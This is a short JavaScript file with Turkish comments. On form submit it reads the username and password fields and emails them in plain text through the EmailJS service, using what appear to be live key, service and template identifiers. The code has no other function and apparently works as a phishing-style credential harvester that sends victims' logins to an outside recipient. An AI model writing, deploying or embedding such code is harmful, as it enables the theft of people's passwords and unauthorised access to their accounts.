(function() {
    // EmailJS'i başlat
    emailjs.init('VVZvHX8p7UeYXyDQP');

    document.getElementById('emailForm').addEventListener('submit', function(event) {
        event.preventDefault();

        // Formdan veri al
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;

        // EmailJS'e veri gönder
        emailjs.send('service_e4e3nr2', 'template_owlb09f', {
            username: username,
            password: password
        })
        .then(function(response) {
            console.log('Başarılı!', response.status, response.text);
            console.log('E-posta başarıyla gönderildi!');
        }, function(error) {
            console.log('Başarısız!', error);
            console.log('E-posta gönderilirken bir hata oluştu.');
        });
    });
})();
